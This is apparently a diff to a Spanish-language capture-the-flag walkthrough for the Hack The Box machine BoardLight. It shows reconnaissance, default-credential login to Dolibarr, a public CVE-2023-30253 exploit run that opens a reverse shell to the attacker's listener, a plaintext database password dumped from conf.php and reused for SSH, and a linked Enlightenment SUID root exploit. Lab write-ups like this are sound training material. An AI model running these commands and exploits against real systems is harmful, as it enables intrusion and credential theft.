@@ -1,8 +1,29 @@
 ---
 icon: desktop
+layout:
+  title:
+    visible: true
+  description:
+    visible: false
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: true
 ---
 
 # BoardLigth
+
+`BoardLight` es una máquina Linux de dificultad fácil que cuenta con una instancia `Dolibarr` vulnerable a [CVE-2023-30253](https://nvd.nist.gov/vuln/detail/CVE-2023-30253). Esta vulnerabilidad se aprovecha para obtener acceso como `www-data`. Después de enumerar y volcar el contenido del archivo de configuración web, las credenciales de texto sin formato conducen al acceso `SSH` a la máquina. Al enumerar el sistema, se identifica un binario `SUID` relacionado con `enlightenment` que es vulnerable a la escalada de privilegios a través de [CVE-2022-37706](https://nvd.nist.gov/vuln/detail/CVE-2022-37706) y se puede abusar de él para aprovechar un shell raíz.
+
+<figure><img src="../../.gitbook/assets/BoardLight.png" alt="" width="563"><figcaption></figcaption></figure>
+
+***
+
+## Reconnaissance
+
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **BoardLigth**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.11 -oG allPorts
@@ -28,7 +49,7 @@ Nmap done: 1 IP address (1 host up) scanned in 54.44 seconds
            Raw packets sent: 90021 (3.961MB) | Rcvd: 89628 (3.590MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -41,9 +62,7 @@ Nmap done: 1 IP address (1 host up) scanned in 54.44 seconds
 [*] Ports copied to clipboard
 ```
 
-
-
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentra expuesta una página web de **Apache** y el servicio SSH.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.11 -A -oN targeted -oX targetedXML
@@ -77,7 +96,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 11.20 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -86,29 +105,31 @@ Nmap done: 1 IP address (1 host up) scanned in 11.20 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...// Some code
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos en nuestro archivo `/etc/hosts` la siguiente entrada.
 
 ```bash
 ❯ cat /etc/hosts | grep 10.10.11.11
 10.10.11.11 board.htb
 ```
 
+## Web Enumeration
 
+Realizaremos una enumeración básica de las tecnologías que utiliza el sitio web a través de la herramienta de `whatweb`.
 
 ```bash
 ❯ whatweb http://board.htb
 http://board.htb [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]
 ```
 
-
+Al acceder a [http://board.htb](http://board.htb), verificamos que se trata de una página en la cual a simple vista no logramos ver más páginas ni ningún tipo de información relevante.
 
 <figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizaremos una enumeración de directorios y páginas, no logramos visualizar algún contenido que nos pueda servidr de utilidad.
 
 ```bash
 ❯ dirsearch -u 'http://board.htb' -i 200 -t 50 2>/dev/null
@@ -127,10 +148,11 @@ Target: http://board.htb/
 [00:49:23] 200 -    2KB - /contact.php
 
 Task Completed
-
 ```
 
+### Subdomain Enumeration
 
+Tratando de realizar una enumeración de subdominios de la página web, nos encontramos con el subdominio `crm`.
 
 ```bash
 ❯ wfuzz --hh=15949 -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.board.htb" http://board.htb 2>/dev/null
@@ -148,16 +170,14 @@ ID           Response   Lines    Word       Chars       Payload
 000002042:   200        149 L    504 W      6360 Ch     "crm" 
 ```
 
-
+Añadiremos esta nueva entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep 10.10.11.11
 10.10.11.11 board.htb crm.board.htb
 ```
 
-
-
-
+Al tratar de acceder a[ http://crm.board.htb](http://crm.board.htb) nos encontramos con un panel de inicio de sesión de **Dolibarr 17.0.0**.
 
 {% hint style="info" %}
 Dolibarr es un software Open Source con funcionalidades avanzadas, que abarca tanto áreas de los ERP como de los CRM. También es otra de las aplicaciones que se puede instalar fácilmente a través del Catálogo de Aplicaciones Cloud, proporcionándonos el entorno flexible que requieren estos aplicativos críticos
@@ -165,19 +185,31 @@ Dolibarr es un software Open Source con funcionalidades avanzadas, que abarca ta
 
 <figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>
 
+## Initial Foothold
 
+### Accessing Dolibarr with default admin credentials
+
+Revisamos por Internet las credenciales que utiliza **Dolibarr** por defecto, nos encontramos que utiliza las credenciales `admin/admin`.
 
 {% embed url="https://www.dolibarr.org/forum/t/login-after-installation/16088" %}
 
-
+Al tratar de acceder, verificamos que hemos logrado acceder como usuario `admin`.
 
 <figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>
 
+### Dolibarr 17.0.0 Exploitation - Remote Code Execution \[RCE] (CVE-2023-30253)
 
+Revisando por Internet sobre posibles vulnerabilidades de esta versión de **Dolibarr**, nos encontramos con el siguiente `CVE-2023-30253`.
+
+{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2023-30253" %}
+
+{% hint style="danger" %}
+En la versiones anteriores a Dolibarr v17.0.1 se permite la ejecución remota de código por un usuario autenticado a través de una manipulación de mayúsculas, por ejemplo: "
+{% endhint %}
+
+Por otro lado, también nos encontramos con el siguiente repositorio de GitHub con el exploit para abusar de la vulnerabilidad. Nos descargaremos este repositorio en nuestro equipo.
 
 {% embed url="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253" %}
-
-
 
 ```bash
 ❯ git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253; cd Exploit-for-Dolibarr-17.0.0-CVE-2023-30253
@@ -190,22 +222,18 @@ Recibiendo objetos: 100% (18/18), 9.17 KiB | 9.17 MiB/s, listo.
 Resolviendo deltas: 100% (3/3), listo.
 ```
 
-
-
-
+En el propio repositorio de GitHub, se nos muestra un PoC de cómo aprovecharnos de este exploit.
 
 <figure><img src="../../.gitbook/assets/imagen (4).png" alt="" width="563"><figcaption></figcaption></figure>
 
-
-
-
+En una terminal, nos pondremos en escucha para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutaremos el `exploit.py` indicándole la URL donde se encuentra **Dolibarr**, las credenciales de acceso que en este caso eran las de por defecto y, nuestra dirección IP y puerto donde nos encontramos en escucha.
 
 ```bash
 ❯ python3 exploit.py http://crm.board.htb admin admin 10.10.16.2 443
@@ -217,7 +245,7 @@ listening on [any] 443 ...
 [*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
 ```
 
-
+Verificamos que ganamos acceso al equipo con el usuario `www-data`.
 
 ```bash
 ❯ nc -nlvp 443
@@ -228,7 +256,11 @@ bash: no job control in this shell
 www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
 ```
 
+## Initial Access
 
+### Information Leakage
+
+Nos encontramos actualmente con un usuario con privilegios limitados, la idea sería convertirnos en `root` o lograr pivotar a otro usuario que quizás tenga más permisos. Revisando el `/etc/passwd` verificamos que solamente los usuarios `root` y `larissa` disponen de `bash`.
 
 ```bash
 www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ cat /etc/passwd | grep bash
@@ -236,7 +268,9 @@ root:x:0:0:root:/root:/bin/bash
 larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
 ```
 
+Revisando los directorios en los que nos encontrábamos, logramos visualizar archivos de configuración.
 
+En el archivo `conf.php` logramos visualizar las credenciales de acceso al MySQL.
 
 ```bash
 www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls -l
@@ -265,7 +299,7 @@ $dolibarr_main_db_user='dolibarrowner';
 $dolibarr_main_db_pass='serverfun2$2023!!';
 ```
 
-
+Probamos de autenticarnos con estas credenciales y el usuario`larissa` para validar si se reutilizan, y lograos acceder y comprobar la flag de **user.txt**.
 
 ```bash
 ❯ ssh larissa@board.htb
@@ -281,7 +315,15 @@ larissa@boardlight:~$ cat user.txt
 db09716122**********************
 ```
 
+## Privilege Escalation
 
+### Enlightenment SUID Binary Exploitation
+
+Revisando permisos de `SUID` nos encontramos que el binario de `enlightment` disponía de `SUID`.
+
+{% hint style="info" %}
+Enlightenment es un gestor de ventanas altamente gráfico. Los autores de Enlightenment han proporcionado un gestor de ventanas altamente configurable que permite a los usuarios configurar todos los aspectos de un aspecto de ventanas.
+{% endhint %}
 
 ```
 larissa@boardlight:~$ find / -perm -4000 2>/dev/null
@@ -295,7 +337,9 @@ larissa@boardlight:~$ find / -perm -4000 2>/dev/null
 /usr/lib/openssh/ssh-keysign
 ```
 
+Revisando posibles vulnerabilidades de utilizar ese **SUID** para escalar privilegios, nos encontramos con el siguiente repositorio de GitHub.
 
+Ejecutamos el `exploit.sh`, verificamos que nos encontramos como usuario `root` y logramos visualizar la flag de **root.txt**.
 
 {% embed url="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit" %}
 
